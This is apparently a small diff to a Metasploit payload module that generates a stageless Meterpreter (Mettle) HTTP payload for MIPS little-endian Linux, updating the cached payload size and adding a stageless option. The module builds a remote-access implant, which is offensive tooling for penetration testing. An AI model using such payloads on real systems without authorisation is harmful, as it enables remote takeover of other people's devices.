@@ -10,7 +10,7 @@ require 'msf/base/sessions/meterpreter_mipsle_linux'
 
 module MetasploitModule
 
-  CachedSize = 1002424
+  CachedSize = 1007120
 
   include Msf::Payload::Single
   include Msf::Sessions::MeterpreterOptions
@@ -36,7 +36,10 @@ module MetasploitModule
   end
 
   def generate
-    opts = {scheme: 'http'}
+    opts = {
+      scheme: 'http',
+      stageless: true
+    }
     MetasploitPayloads::Mettle.new('mipsel-linux-muslsf', generate_config(opts)).to_binary :exec
   end
 end
